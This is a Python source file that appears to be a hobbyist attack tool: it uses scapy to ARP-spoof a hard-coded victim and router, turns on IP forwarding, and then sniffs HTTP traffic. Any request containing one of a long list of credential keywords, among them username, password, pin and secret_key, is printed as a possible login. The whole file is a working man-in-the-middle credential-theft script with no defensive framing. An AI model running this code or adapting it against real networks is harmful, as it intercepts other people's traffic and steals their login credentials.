import scapy.all as scapy
from scapy.layers import http
import time
import subprocess
from threading import Thread

# Victim and router IPs
victim_ip = "172.16.149.163"
router_ip = "172.16.149.2"

# Enable port forwarding
def enable_port_forwarding():
    try:
        subprocess.run(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True, check=True)
        print("[INFO] Port forwarding has been enabled.")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to enable port forwarding: {e}")
        raise

# Restore original ARP settings
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

# ARP spoofing function
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Get MAC address of a device
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

# ARP spoofer loop
def arp_spoof():
    sent_packet_counter = 0
    try:
        while True:
            spoof(victim_ip, router_ip)
            spoof(router_ip, victim_ip)
            sent_packet_counter += 2
            print(f"\r[+] Packets sent: {sent_packet_counter}", end="", flush=True)
            if sent_packet_counter >= 10:
                print("\n[INFO] Starting packet sniffer after 10 packets.")
                break
            time.sleep(2)
    except KeyboardInterrupt:
        restore(victim_ip, router_ip)
        restore(router_ip, victim_ip)
        print("\n[+] Detected CTRL + C, restoring ARP tables.")

# Packet sniffer functions
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode('utf-8', errors='ignore')
    path = packet[http.HTTPRequest].Path.decode('utf-8', errors='ignore')
    return f"{host}{path}"

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
        username_terms = [
            "username", "user", "userid", "user_id", "uname", "login", "login_name",
            "user_name", "email", "email_address", "account", "account_name", "handle",
            "profile_name", "alias", "member_id", "customer_id", "user_identifier",
            "user_key", "screen_name", "nickname", "auth_user", "login_user", "password",
            "passwd", "pwd", "pass", "login_password", "user_password", "pin", "passcode",
            "access_code", "secret", "secret_key", "auth_key", "passphrase", "login_key",
            "credentials", "security_code", "auth_password", "member_password",
            "account_password", "login_credentials", "auth_credentials", "user_login",
            "user_auth", "user_access", "account_login"
        ]
        for term in username_terms:
            if term in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
        login_info = get_login(packet)
        if login_info:
            print(f"\n[+] Possible username/password combination: {login_info}\n")

# Main function
if __name__ == "__main__":
    enable_port_forwarding()

    # Run the ARP spoofer in a separate thread
    arp_thread = Thread(target=arp_spoof)
    arp_thread.start()

    # Wait for the ARP spoofer to send 10 packets
    arp_thread.join()

    # Start packet sniffing
    try:
        sniff("eth0")  # Replace "eth0" with your network interface
    except KeyboardInterrupt:
        # Restore ARP tables on interruption
        restore(victim_ip, router_ip)
        restore(router_ip, victim_ip)
        print("\n[+] Detected CTRL + C, restoring ARP tables and exiting.")
